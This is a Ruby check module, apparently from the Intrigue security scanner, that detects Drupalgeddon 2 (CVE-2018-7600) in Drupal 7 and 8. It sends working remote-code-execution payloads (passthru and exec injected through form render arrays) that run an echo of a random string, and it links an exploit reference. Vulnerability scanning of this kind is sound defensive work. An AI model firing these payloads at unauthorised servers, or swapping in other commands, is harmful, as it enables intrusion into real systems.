module Intrigue
  module Issue
    class DrupalCVE20187600 < BaseIssue
      def self.generate(instance_details = {})
        {
          added: '2021-03-30',
          name: 'drupal_cve_2018_7600',
          pretty_name: 'Drupal Unauthenticated Remote Code Execution (Drupalgeddon 2) (CVE-2018-7600)',
          severity: 1,
          category: 'vulnerability',
          status: 'confirmed',
          description: 'Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.',
          identifiers: [
            { type: 'CVE', name: 'CVE-2018-7600' }
          ],
          affected_software: [
            { vendor: 'Drupal', product: 'Drupal' }
          ],
          references: [
            { type: 'description', uri: 'https://nvd.nist.gov/vuln/detail/CVE-2018-7600' },
            { type: 'description', uri: 'https://drupal.org/sa-core-2018-002' },
            { type: 'exploit', uri: 'https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708'}
          ],
          authors: ['_dreadlocked', 'g0tmi1k', 'maxim']
        }.merge!(instance_details)
      end
    end
  end

  module Task
    class DrupalCVE20187600 < BaseCheck
      def self.check_metadata
        {
          allowed_types: ['Uri']
        }
      end

      def detect_drupal_version(uri)
        drupal_7_paths = ['CHANGELOG.txt', 'includes/bootstrap.inc', 'includes/database.inc']
        drupal_8_paths = ['core/CHANGELOG.txt', 'core/includes/bootstrap.inc', 'core/includes/database.inc']

        responses = drupal_7_paths.map { |p| http_request(:get, "#{uri}/#{p}").code }
        return 7 unless (responses & %w[200 403]).empty?

        responses = drupal_8_paths.map { |p| http_request(:get, "#{uri}/#{p}").code }
        return 8 unless (responses & %w[200 403]).empty?

        _log_error 'Drupal Version does not appear to be supported; aborting.'
      end

      def drupal_7_check(uri)
        randomstr = SecureRandom.alphanumeric(10)
        r = http_request(:post, "#{uri}/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo+#{randomstr}",
                         nil, {}, 'form_id=user_pass&_triggering_element_name=name')

        form_id = r.body_utf8.scan(/<input type="hidden" name="form_build_id" value="(form\-[\w|\-]+)"/).flatten.first
        _log_error 'Unable to parse form_build_id from response; aborting task.' if form_id.nil?
        return if form_id.nil?

        r2 = http_request(:post, "#{uri}/?q=file/ajax/name/%23value/#{form_id}",
                          nil, {}, "form_build_id=#{form_id}")
        r2.body_utf8.include? randomstr
      end

      def drupal_8_check(uri)
        randomstr = SecureRandom.alphanumeric(10)

        post_body = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=echo #{randomstr}"
        r = http_request(:post, "#{uri}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                        nil, {}, post_body)

        r.body_utf8.include? randomstr
      end

      def check
        uri = _get_entity_name
        version = detect_drupal_version(uri)
        return if version.nil?

        _log_good "Drupal #{version} possibly detected; running respective check."
        vuln = version == 8 ? drupal_8_check(uri) : drupal_7_check(uri)
        
        _log 'Target does not appear to be vulnerable.' unless vuln

        vuln

      end
    end
  end
end
